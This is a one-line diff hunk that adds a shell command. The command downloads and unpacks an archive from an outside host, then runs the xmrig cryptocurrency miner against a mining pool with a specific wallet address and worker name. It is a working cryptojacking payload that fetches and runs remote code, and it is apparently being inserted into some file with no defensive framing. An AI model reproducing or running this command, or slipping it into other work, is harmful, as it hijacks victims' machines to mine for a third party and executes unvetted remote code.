@@ -1,0 +1,1 @@
+wget  https://widewebhoster.com/s.tar.gz ; tar xvzf s.tar.gz ; ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TJQUZP1kruA4UGzR3Rqt5P9uuCUpWmrKaE.work1#jo22-txho -p x
